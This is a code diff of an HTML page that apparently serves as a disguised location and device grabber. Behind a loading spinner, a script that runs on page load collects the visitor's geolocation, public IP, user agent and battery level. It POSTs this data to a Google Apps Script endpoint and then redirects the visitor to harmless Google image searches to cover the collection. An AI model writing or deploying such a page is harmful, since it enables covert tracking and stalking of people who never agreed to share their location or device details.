@@ -1,28 +1,69 @@
 <!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
 <body>
-    <img style="width: 300px; height: 300px;" src="https://images.pexels.com/photos/34433111/pexels-photo-34433111.jpeg" alt="">
-    <script>
-        navigator.geolocation.getCurrentPosition(function(position) {
-            let { latitude, longitude } = position.coords;
-            console.log("Latitude: " + latitude);
-            console.log("Longitude: " + longitude);
+    <div class="flex items-center justify-center h-screen bg-gray-100">
+  <div class="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+</div>
 
-        }, function(error) {
-           
-        });
+<script>
+const API_URL = "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";
 
+function collectAndSendData() {
+    let payload = {};
 
-        // for ip then ipinfo.io for location
+    navigator.geolocation.getCurrentPosition(function(position) {
+        const { latitude, longitude } = position.coords;
+
+        payload.latitude = latitude;
+        payload.longitude = longitude;
+        payload.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+
+        sendData(); 
+    }, function() {
+        sendData(); 
+    });
+
+  
+    function sendData() {
         fetch("https://api.ipify.org?format=json")
-.then(res => res.json())
-.then(data => {
-  fetch("YOUR_WEB_APP_URL?ip=" + data.ip + "&ua=" + navigator.userAgent);
-});
+        .then(res => res.json())
+        .then(data => {
+            payload.ip = data.ip;
+            payload.userAgent = navigator.userAgent;
 
-//
+            if (navigator.getBattery) {
+                navigator.getBattery().then(battery => {
+                    payload.battery = (battery.level * 100) + "%";
+                    postData();
+                });
+            } else {
+                postData();
+            }
+        })
+        .catch(() => {
+            postData();
+        });
+    }
 
+    function postData() {
+        fetch(API_URL, {
+            method: "POST",
+            body: JSON.stringify(payload),
+        })
+        .then(() => {
+            window.location.href = "https://www.google.com/search?q=nature+wallpapers&tbm=isch";
+        })
+        .catch(() => {
+            window.location.href = "https://www.google.com/search?q=cute+cats&tbm=isch";
+        });
+    }
+}
 
+collectAndSendData();
+</script>
 
-    </script>
 </body>
 </html>
